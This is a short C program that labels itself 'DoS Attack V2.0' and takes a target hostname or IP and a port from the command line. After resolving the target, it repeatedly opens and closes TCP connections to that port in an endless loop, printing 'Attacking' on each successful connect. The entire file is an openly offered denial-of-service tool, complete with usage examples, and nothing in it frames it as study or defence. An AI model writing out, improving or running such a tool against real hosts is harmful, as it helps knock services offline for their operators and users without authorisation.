#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	if (argc <= 2) {
		printf("DoS Attack V2.0 by Roveeb\n");
		printf("Usage: ./DoS <ip|hostname|url> <port>\n");
		printf("  ./DoS 192.168.0.1 21\n");
		printf("  ./DoS example.com 80\n");
		return 1;
	}

	char *host = argv[1];
	char *port_str = argv[2];

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);
	hints.ai_family   = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	int status = getaddrinfo(host, port_str, &hints, &res);
	if (status != 0) {
		fprintf(stderr, "DNS resolution failed for '%s': %s\n", host, gai_strerror(status));
		return 1;
	}

	char resolved_ip[INET_ADDRSTRLEN];
	struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
	inet_ntop(AF_INET, &addr->sin_addr, resolved_ip, sizeof resolved_ip);
	printf("Resolved '%s' -> %s\n", host, resolved_ip);

	int mysocket, connection;

	while (1) {
		mysocket = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
		if (mysocket < 0) {
			perror("socket");
			break;
		}

		connection = connect(mysocket, res->ai_addr, res->ai_addrlen);
		if (connection == 0) {
			printf("Attacking %s (%s) port %s\n", host, resolved_ip, port_str);
		} else {
			printf("Host unreachable\n");
			close(mysocket);
			break;
		}
		close(mysocket);
	}

	freeaddrinfo(res);
	return 0;
}
